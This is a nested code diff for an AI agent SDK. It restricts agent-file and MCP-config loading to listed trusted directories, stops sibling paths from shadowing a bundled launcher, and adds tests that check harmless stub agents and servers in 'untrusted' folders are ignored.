+ const packagedLauncherPath = path.join(__dirname, 'launcher.js')
+ const sourceLauncherPath = path.join(
+   __dirname,
+   '..',
+   '..',
+   '..',
+   'cli',
+   'release-core',
+   'launcher.js',
+ )
+ // Published packages must not let an unrelated sibling path shadow their
+ // bundled launcher. Source checkouts only fall back when that copy is absent.
+ const { createLauncher } = require(
+   fs.existsSync(packagedLauncherPath)
+     ? packagedLauncherPath
      : sourceLauncherPath,
  )
  
@@ -2851,201 +2591,41 @@ index bd1c5973e..41c6a6b88 100644
    telemetryEvent: 'cli.update_freebuff_failed',
  })
  
-diff --git a/sdk/src/__tests__/load-agents.test.ts b/sdk/src/__tests__/load-agents.test.ts
-index 3eea6cc22..84fc11645 100644
---- a/sdk/src/__tests__/load-agents.test.ts
-+++ b/sdk/src/__tests__/load-agents.test.ts
-@@ -12,7 +12,11 @@ import {
-   spyOn,
- } from 'bun:test'
+ module.exports = launcher
  
--import { loadLocalAgents } from '../agents/load-agents'
-+import {
-+  getDefaultAgentDirs,
-+  listLocalAgentFiles,
-+  loadLocalAgents,
-+} from '../agents/load-agents'
- 
- import type {
-   LoadedAgents,
-@@ -929,4 +933,82 @@ describe('loadLocalAgents', () => {
-       expect(result['test-agent']).toBeDefined()
-     })
+ if (require.main === module) {
+   launcher.main().catch((error) => {
+     console.error('❌ Unexpected error:', error.message)
+     process.exit(1)
    })
-+
-+  describe('agentDirs option', () => {
-+    const agentSource = (id: string) => `
-+      export default { id: '${id}', displayName: '${id}', model: '${MODEL_NAME}' }
-+    `
-+
-+    test('loads only the listed directories', async () => {
-+      const trusted = path.join(tempDir, 'trusted')
-+      const untrusted = path.join(tempDir, 'untrusted')
-+      mkdirSync(trusted, { recursive: true })
-+      mkdirSync(untrusted, { recursive: true })
-+      writeAgentFile(trusted, 'ok.ts', agentSource('ok-agent'))
-+      writeAgentFile(untrusted, 'evil.ts', agentSource('evil-agent'))
-+
-+      const result = await loadLocalAgents({ agentDirs: [trusted] })
-+
-+      expect(Object.keys(result)).toEqual(['ok-agent'])
-+    })
-+
-+    test('an empty list loads nothing', async () => {
-+      mkdirSync(agentsDir, { recursive: true })
-+      writeAgentFile(agentsDir, 'a.ts', agentSource('a'))
-+
-+      expect(await loadLocalAgents({ agentDirs: [] })).toEqual({})
-+      expect(await loadLocalAgents({ agentDirs: [], validate: true })).toEqual({
-+        agents: {},
-+        validationErrors: [],
-+      })
-+    })
-+
-+    test('agentsPath still wins over agentDirs', async () => {
-+      const other = path.join(tempDir, 'other')
-+      mkdirSync(agentsDir, { recursive: true })
-+      mkdirSync(other, { recursive: true })
-+      writeAgentFile(agentsDir, 'a.ts', agentSource('from-path'))
-+      writeAgentFile(other, 'b.ts', agentSource('from-dirs'))
-+
-+      const result = await loadLocalAgents({
-+        agentsPath: agentsDir,
-+        agentDirs: [other],
-+      })
-+
-+      expect(Object.keys(result)).toEqual(['from-path'])
-+    })
-+  })
-+
-+  describe('listLocalAgentFiles', () => {
-+    test('returns the files the loader would import and nothing else', () => {
-+      mkdirSync(path.join(agentsDir, 'skills', 'x'), { recursive: true })
-+      mkdirSync(path.join(agentsDir, 'nested'), { recursive: true })
-+      mkdirSync(path.join(agentsDir, 'node_modules'), { recursive: true })
-+      writeFileSync(path.join(agentsDir, 'a.ts'), '')
-+      writeFileSync(path.join(agentsDir, 'b.mjs'), '')
-+      writeFileSync(path.join(agentsDir, 'nested', 'c.js'), '')
-+      writeFileSync(path.join(agentsDir, 'types.d.ts'), '')
-+      writeFileSync(path.join(agentsDir, 'a.test.ts'), '')
-+      writeFileSync(path.join(agentsDir, 'README.md'), '')
-+      writeFileSync(path.join(agentsDir, 'skills', 'x', 'SKILL.md'), '')
-+      writeFileSync(path.join(agentsDir, 'node_modules', 'dep.js'), '')
-+
-+      expect(listLocalAgentFiles(agentsDir).sort()).toEqual([
-+        path.join(agentsDir, 'a.ts'),
-+        path.join(agentsDir, 'b.mjs'),
-+        path.join(agentsDir, 'nested', 'c.js'),
-+      ])
-+      expect(listLocalAgentFiles(path.join(tempDir, 'missing'))).toEqual([])
-+    })
-+  })
-+
-+  describe('getDefaultAgentDirs', () => {
-+    test('returns cwd, parent and home .agents in precedence order', () => {
-+      expect(getDefaultAgentDirs()).toEqual([
-+        path.join(process.cwd(), '.agents'),
-+        path.join(process.cwd(), '..', '.agents'),
-+        path.join(os.homedir(), '.agents'),
-+      ])
-+    })
-+  })
- })
-diff --git a/sdk/src/__tests__/load-mcp-config.test.ts b/sdk/src/__tests__/load-mcp-config.test.ts
-index 829726d00..ed03e8462 100644
---- a/sdk/src/__tests__/load-mcp-config.test.ts
-+++ b/sdk/src/__tests__/load-mcp-config.test.ts
-@@ -4,12 +4,18 @@ import path from 'path'
- 
- import { afterEach, beforeEach, describe, expect, it } from 'bun:test'
- 
--import { loadMCPConfig, loadMCPConfigSync, mcpFileSchema } from '../agents/load-mcp-config'
-+import {
-+  loadMCPConfig,
-+  loadMCPConfigSync,
-+  mcpFileSchema,
-+} from '../agents/load-mcp-config'
- 
- import type { MCPConfig } from '@codebuff/common/types/mcp'
- 
- // Helper to safely access stdio config properties
--function isStdioConfig(config: MCPConfig): config is MCPConfig & { command: string; env?: Record<string, string> } {
-+function isStdioConfig(
-+  config: MCPConfig,
-+): config is MCPConfig & { command: string; env?: Record<string, string> } {
-   return 'command' in config
  }
- 
-@@ -54,7 +60,9 @@ describe('mcpFileSchema', () => {
-     if (result.success) {
-       const remoteServer = result.data.mcpServers.remoteServer
-       expect(remoteServer).toBeDefined()
--      expect('url' in remoteServer && remoteServer.url).toBe('https://example.com/mcp')
-+      expect('url' in remoteServer && remoteServer.url).toBe(
-+        'https://example.com/mcp',
-+      )
-     }
-   })
- 
-@@ -275,3 +283,53 @@ describe('loadMCPConfig', () => {
-     }
-   })
- })
-+
-+describe('configDirs option', () => {
-+  let tempDir: string
-+
-+  const writeMcpJson = (dir: string, name: string) => {
-+    fs.mkdirSync(dir, { recursive: true })
-+    fs.writeFileSync(
-+      path.join(dir, 'mcp.json'),
-+      JSON.stringify({ mcpServers: { [name]: { command: 'node' } } }),
-+    )
-+  }
-+
-+  beforeEach(() => {
-+    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-config-dirs-test-'))
-+  })
-+
-+  afterEach(() => {
-+    fs.rmSync(tempDir, { recursive: true, force: true })
-+  })
-+
-+  it('reads mcp.json only from the listed directories (sync)', () => {
-+    const trusted = path.join(tempDir, 'trusted')
-+    const untrusted = path.join(tempDir, 'untrusted')
-+    writeMcpJson(trusted, 'okServer')
-+    writeMcpJson(untrusted, 'evilServer')
-+
-+    const result = loadMCPConfigSync({ configDirs: [trusted] })
-+
-+    expect(Object.keys(result.mcpServers)).toEqual(['okServer'])
-+    expect(result._sourceFilePath).toBe(path.join(trusted, 'mcp.json'))
-+  })
-+
-+  it('reads mcp.json only from the listed directories (async)', async () => {
-+    const trusted = path.join(tempDir, 'trusted')
-+    const untrusted = path.join(tempDir, 'untrusted')
-+    writeMcpJson(trusted, 'okServer')
-+    writeMcpJson(untrusted, 'evilServer')
-+
-+    const result = await loadMCPConfig({ configDirs: [trusted] })
-+
-+    expect(Object.keys(result.mcpServers)).toEqual(['okServer'])
-+  })
-+
-+  it('an empty list loads nothing', async () => {
-+    writeMcpJson(path.join(tempDir, '.agents'), 'server')
-+
-+    expect(loadMCPConfigSync({ configDirs: [] }).mcpServers).toEqual({})
-+    expect((await loadMCPConfig({ configDirs: [] })).mcpServers).toEqual({})
-+  })
-+})
 diff --git a/sdk/src/agents/load-agents.ts b/sdk/src/agents/load-agents.ts
 index b21985ec3..e760fb3a6 100644
 --- a/sdk/src/agents/load-agents.ts
 +++ b/sdk/src/agents/load-agents.ts
-@@ -124,7 +124,16 @@ const isLoadableAgentFileName = (fileName: string): boolean => {
+@@ -102,151 +102,175 @@ export type AgentValidationError = {
+ export type LoadLocalAgentsResult = {
+   /** Valid agent definitions that passed validation */
+   agents: LoadedAgents
+   /** Validation errors for agents that failed validation */
+   validationErrors: AgentValidationError[]
+ }
+ 
+ const agentFileExtensions = new Set(['.ts', '.tsx', '.js', '.mjs', '.cjs'])
+ 
+ const shouldSkipAgentDirectory = (name: string): boolean =>
+   name.startsWith('.') ||
+   name === 'node_modules' ||
+   name === 'scripts' ||
+   name === 'skills' ||
+   name.startsWith('skills-')
+ 
+ const isLoadableAgentFileName = (fileName: string): boolean => {
+   const extension = path.extname(fileName).toLowerCase()
+   return (
+     agentFileExtensions.has(extension) &&
+     !fileName.endsWith('.d.ts') &&
+     !/[./](test|spec)\.[cm]?[tj]sx?$/.test(fileName)
    )
  }
  
@@ -3063,7 +2643,7 @@ index b21985ec3..e760fb3a6 100644
    const files: string[] = []
    try {
      const entries = fs.readdirSync(dir, { withFileTypes: true })
-@@ -132,7 +141,7 @@ const getAllAgentFiles = (dir: string): string[] => {
+     for (const entry of entries) {
        const fullPath = path.join(dir, entry.name)
        if (entry.isDirectory()) {
          if (shouldSkipAgentDirectory(entry.name)) continue
@@ -3072,7 +2652,13 @@ index b21985ec3..e760fb3a6 100644
          continue
        }
        const isAgentFile = entry.isFile() && isLoadableAgentFileName(entry.name)
-@@ -146,7 +155,12 @@ const getAllAgentFiles = (dir: string): string[] => {
+       if (isAgentFile) {
+         files.push(fullPath)
+       }
+     }
+   } catch {
+     // Expected for user agent directories that may not exist
+   }
    return files
  }
  
@@ -3086,7 +2672,18 @@ index b21985ec3..e760fb3a6 100644
    const cwdAgents = path.join(process.cwd(), '.agents')
    const parentAgents = path.join(process.cwd(), '..', '.agents')
    const homeAgents = path.join(os.homedir(), '.agents')
-@@ -165,6 +179,10 @@ const getDefaultAgentDirs = () => {
+   return [cwdAgents, parentAgents, homeAgents]
+ }
+ 
+ /**
+  * Load agent definitions from `.agents` directories.
+  *
+  * By default, searches for agents in:
+  * - `{cwd}/.agents`
+  * - `{cwd}/../.agents`
+  * - `{homedir}/.agents`
+  *
+  * Agent files can be `.ts`, `.tsx`, `.js`, `.mjs`, or `.cjs`.
   * TypeScript files are loaded natively by Bun's runtime.
   *
   * @param options.agentsPath - Optional path to a specific agents directory
@@ -3097,7 +2694,35 @@ index b21985ec3..e760fb3a6 100644
   * @param options.verbose - Whether to log errors during loading
   * @param options.validate - Whether to validate agents after loading
   * @returns When validate is false/omitted: Record of agent definitions keyed by agent ID.
-@@ -200,6 +218,7 @@ const getDefaultAgentDirs = () => {
+  *          When validate is true: Object with valid agents and validation errors.
+  *
+  * @example
+  * ```typescript
+  * // Load from default locations
+  * const agents = await loadLocalAgents({ verbose: true })
+  *
+  * // Load from a specific directory
+  * const agents = await loadLocalAgents({ agentsPath: './my-agents' })
+  *
+  * // Load and validate agents - returns both valid agents and errors
+  * const { agents, validationErrors } = await loadLocalAgents({ validate: true })
+  * if (validationErrors.length > 0) {
+  *   console.error('Some agents failed validation:', validationErrors)
+  * }
+  *
+  * // Access source file path for debugging
+  * for (const agent of Object.values(agents)) {
+  *   console.log(`${agent.id} loaded from ${agent._sourceFilePath}`)
+  * }
+  *
+  * // Use with client.run()
+  * const result = await client.run({
+  *   agent: 'my-agent',
+  *   agentDefinitions: Object.values(agents),
+  *   prompt: 'Hello',
+  * })
+  * ```
+  */
  // Overload: validate: true returns result with agents and errors
  export async function loadLocalAgents(options: {
    agentsPath?: string
@@ -3105,7 +2730,7 @@ index b21985ec3..e760fb3a6 100644
    verbose?: boolean
    validate: true
  }): Promise<LoadLocalAgentsResult>
-@@ -207,6 +226,7 @@ export async function loadLocalAgents(options: {
+ 
  // Overload: validate: false or omitted returns just agents (backward compatible)
  export async function loadLocalAgents(options: {
    agentsPath?: string
@@ -3113,7 +2738,7 @@ index b21985ec3..e760fb3a6 100644
    verbose?: boolean
    validate?: false
  }): Promise<LoadedAgents>
-@@ -214,17 +234,21 @@ export async function loadLocalAgents(options: {
+ 
  // Implementation
  export async function loadLocalAgents({
    agentsPath,
@@ -3137,11 +2762,55 @@ index b21985ec3..e760fb3a6 100644
  
    if (allAgentFiles.length === 0) {
      return validate ? { agents, validationErrors: [] } : agents
+   }
+ 
+   for (const fullPath of allAgentFiles) {
+     try {
+       const agentModule = await importAgentModule(fullPath)
+       if (!agentModule) {
+         continue
+       }
+       const agentDefinition = agentModule.default ?? agentModule
+ 
+       if (!agentDefinition?.id || !agentDefinition?.model) {
+         if (verbose) {
+           console.error(
+             `Agent definition missing required attributes (id, model): ${fullPath}`,
+           )
+         }
+         continue
+       }
+ 
+       const processedAgentDefinition: LoadedAgentDefinition = {
+         ...agentDefinition,
+         _sourceFilePath: fullPath,
 diff --git a/sdk/src/agents/load-mcp-config.ts b/sdk/src/agents/load-mcp-config.ts
 index 51e953c61..bd4bb347d 100644
 --- a/sdk/src/agents/load-mcp-config.ts
 +++ b/sdk/src/agents/load-mcp-config.ts
-@@ -86,7 +86,7 @@ function resolveMcpConfigEnv(config: MCPFileConfig): void {
+@@ -64,99 +64,104 @@ function resolveMcpEnv(
+       resolved[key] = envValue
+     } else {
+       // Plain string value - use as-is
+       resolved[key] = value
+     }
+   }
+ 
+   return resolved
+ }
+ 
+ /**
+  * Resolves all MCP server env references in a config.
+  * Mutates the mcpServers object to replace $VAR_NAME references with resolved values.
+  *
+  * @param config - The MCP file config to process
+  * @throws Error if any referenced environment variable is missing
+  */
+ function resolveMcpConfigEnv(config: MCPFileConfig): void {
+   for (const [serverName, serverConfig] of Object.entries(config.mcpServers)) {
+     if ('command' in serverConfig && serverConfig.env) {
+       serverConfig.env = resolveMcpEnv(serverConfig.env, serverName)
+     }
    }
  }
  
@@ -3150,7 +2819,24 @@ index 51e953c61..bd4bb347d 100644
  
  /**
   * Get default directories to search for mcp.json.
-@@ -111,6 +111,10 @@ const getDefaultMcpConfigDirs = (): string[] => {
+  * Matches the agent loading directories for consistency.
+  */
+ const getDefaultMcpConfigDirs = (): string[] => {
+   const cwdAgents = path.join(process.cwd(), '.agents')
+   const parentAgents = path.join(process.cwd(), '..', '.agents')
+   const homeAgents = path.join(os.homedir(), '.agents')
+   return [cwdAgents, parentAgents, homeAgents]
+ }
+ 
+ /**
+  * Load MCP configuration from `mcp.json` files in `.agents` directories.
+  *
+  * By default, searches for mcp.json in:
+  * - `{cwd}/.agents/mcp.json`
+  * - `{cwd}/../.agents/mcp.json`
+  * - `{homedir}/.agents/mcp.json`
+  *
+  * Later directories take precedence, so project MCP servers override global ones.
   * Environment variable references (e.g., `$API_KEY`) are resolved from process.env.
   *
   * @param options.verbose - Whether to log errors during loading
@@ -3161,7 +2847,15 @@ index 51e953c61..bd4bb347d 100644
   * @returns Record of MCP server configurations keyed by server name
   *
   * @example
-@@ -126,15 +130,16 @@ const getDefaultMcpConfigDirs = (): string[] => {
+  * ```typescript
+  * // Load from default locations
+  * const mcpConfig = await loadMCPConfig({ verbose: true })
+  *
+  * // Access MCP servers
+  * for (const [serverName, config] of Object.entries(mcpConfig.mcpServers)) {
+  *   console.log(`MCP server: ${serverName}`)
+  * }
+  * ```
   */
  export async function loadMCPConfig(options: {
    verbose?: boolean
@@ -3180,7 +2874,51 @@ index 51e953c61..bd4bb347d 100644
  
    for (const dir of mcpConfigDirs) {
      const configPath = path.join(dir, MCP_CONFIG_FILE_NAME)
-@@ -201,19 +206,22 @@ export async function loadMCPConfig(options: {
+ 
+     try {
+       // Check if file exists asynchronously
+       try {
+         await fsPromises.access(configPath)
+       } catch {
+         continue
+       }
+ 
+       const content = await fsPromises.readFile(configPath, 'utf8')
+       const rawConfig = JSON.parse(content)
+       const parseResult = mcpFileSchema.safeParse(rawConfig)
+ 
+       if (!parseResult.success) {
+         if (verbose) {
+           console.error(
+             `Invalid mcp.json at ${configPath}: ${parseResult.error.message}`,
+           )
+         }
+         continue
+       }
+ 
+@@ -179,63 +184,66 @@ export async function loadMCPConfig(options: {
+         mergedConfig.mcpServers[serverName] = serverConfig
+       }
+ 
+       // Track the last successfully loaded config path
+       if (Object.keys(parsedConfig.mcpServers).length > 0) {
+         mergedConfig._sourceFilePath = configPath
+       }
+     } catch (error) {
+       if (verbose) {
+         console.error(
+           `Error loading mcp.json from ${configPath}:`,
+           error instanceof Error ? error.message : error,
+         )
+       }
+     }
+   }
+ 
+   return mergedConfig
+ }
+ 
+ /**
+  * Synchronously load MCP configuration from `mcp.json` files in `.agents` directories.
   * This is a sync version for use in contexts where async is not available.
   *
   * @param options.verbose - Whether to log errors during loading
@@ -3205,11 +2943,55 @@ index 51e953c61..bd4bb347d 100644
  
    for (const dir of mcpConfigDirs) {
      const configPath = path.join(dir, MCP_CONFIG_FILE_NAME)
+ 
+     try {
+       if (!fs.existsSync(configPath)) {
+         continue
+       }
+ 
+       const content = fs.readFileSync(configPath, 'utf8')
+       const rawConfig = JSON.parse(content)
+       const parseResult = mcpFileSchema.safeParse(rawConfig)
+ 
+       if (!parseResult.success) {
+         if (verbose) {
+           console.error(
+             `Invalid mcp.json at ${configPath}: ${parseResult.error.message}`,
+           )
+         }
+         continue
+       }
+ 
+       const parsedConfig = parseResult.data
+ 
+       // Resolve environment variable references
 diff --git a/sdk/src/index.ts b/sdk/src/index.ts
 index 7a8ee2ad0..082425d17 100644
 --- a/sdk/src/index.ts
 +++ b/sdk/src/index.ts
-@@ -49,8 +49,17 @@ export {
+@@ -27,52 +27,61 @@ export { buildUserMessageContent } from '@codebuff/agent-runtime/util/messages'
+ export type { AgentDefinition } from '@codebuff/common/templates/initial-agents-dir/types/agent-definition'
+ export type { ToolName } from '@codebuff/common/tools/constants'
+ 
+ export type {
+   ClientToolCall,
+   ClientToolName,
+   CodebuffToolOutput,
+ } from '@codebuff/common/tools/list'
+ export * from './client'
+ export * from './custom-tool'
+ export * from './native/ripgrep'
+ export * from './run-state'
+ export { ToolHelpers } from './tools'
+ export * from './constants'
+ export { isAllowedRuntimeAppUrl } from './env'
+ 
+ export { getUserInfoFromApiKey } from './impl/database'
+ export {
+   ALWAYS_TRUSTED_AGENT_PUBLISHERS,
+   TRUSTED_AGENT_PUBLISHERS_ENV_VAR,
+   UntrustedAgentPublisherError,
+   isUntrustedAgentPublisherError,
  } from './agent-publisher-trust'
  export * from './credentials'
  export * from './byok'
@@ -3229,3 +3011,25 @@ index 7a8ee2ad0..082425d17 100644
  export {
    loadSkills,
    loadSkillsSync,
+   parseSkillFileContent,
+ } from './skills/load-skills'
+ export { formatAvailableSkillsXml } from '@codebuff/common/util/skills'
+ export type { LoadSkillsOptions } from './skills/load-skills'
+ export type { SkillDefinition, SkillsMap } from '@codebuff/common/types/skill'
+ export type {
+   LoadedAgents,
+   LoadedAgentDefinition,
+   LoadLocalAgentsResult,
+   AgentValidationError,
+ } from './agents/load-agents'
+ export type { MCPFileConfig, LoadedMCPConfig } from './agents/load-mcp-config'
+ 
+ export { validateAgents } from './validate-agents'
+ export type { ValidationResult, ValidateAgentsOptions } from './validate-agents'
+ 
+ // Free-mode capacity deferral notifications (server-side tier shedding)
+ export { setFreeModeCapacityDeferralListener } from './impl/model-provider'
+ export type { FreeModeCapacityDeferral } from './impl/model-provider'
+ 
+ // Error utilities
+ export {
